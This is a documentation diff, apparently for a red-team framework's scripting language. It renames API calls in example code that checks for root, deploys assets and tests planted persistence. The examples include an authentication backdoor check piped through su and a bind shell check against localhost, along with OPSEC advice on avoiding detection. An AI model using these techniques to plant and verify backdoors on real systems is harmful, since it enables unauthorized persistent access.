@@ -146,7 +146,7 @@ OPSEC considerations will tend towards avoiding calls to `shell` and `exec` inst
 
 In some situations you may also wish to avoid testing on target if that's the case you should test thoroughly off target before launching.
 
-If you test off target you can leverage native functions like [`sys.get_os`](/user-guide/eldritch#sysget_os) to ensure that your tome only runs against targets it's been tested on.
+If you test off target you can leverage native functions like [`sys.info`](/user-guide/eldritch#sysinfo) to ensure that your tome only runs against targets it's been tested on.
 
 ### Example
 
@@ -166,7 +166,7 @@ def pre_flight(dest_bin_path):
       print("[error] tome only supports linux")
       return False
 
-    cur_user = sys.get_user()
+    cur_user = user.info()
     if cur_user['euid']['uid'] != 0:
       print(f"[error] tome must be run as root / uid 0 not {cur_user}")
       return False
@@ -190,7 +190,7 @@ def pre_flight(dest_bin_path):
 
 def deploy_asset(asset_path, dest, asset_hash):
   if file.is_file(asset_path):
-    if crypto.hash_file(asset_path, "SHA1") != asset_hash:
+    if hash.file(asset_path, "SHA1") != asset_hash:
       print(f"{dest} file already exists and is good")
       return True
 
@@ -292,7 +292,7 @@ file.copy(config_path, f"{config_path}.bak")
 if not end_to_end_test():
     print("[error] end to end test failed cleaning up")
     file.remove(config_path)
-    file.moveto(f"{config_path}.bak", config_path)
+    file.move(f"{config_path}.bak", config_path)
     return
 
 file.remove(f"{config_path}.bak")
@@ -302,7 +302,7 @@ End to end test can validate the backdoor - if possible validate normal system f
 
 ```python
 # Auth backdoor - drop to a user account or `nobody` and then auth to a user account
-sys.shell(f"echo -e '{password}\n{password}\n' | su {user} -c 'su {user} -c id'")
+sys.shell(f"echo -e '{password}\n{password}\n' | su {cur_user} -c 'su {cur_user} -c id'")
 
 # Bind shell - check against localhost
 res = sys.shell(f"{shell_client} 127.0.0.1 id")
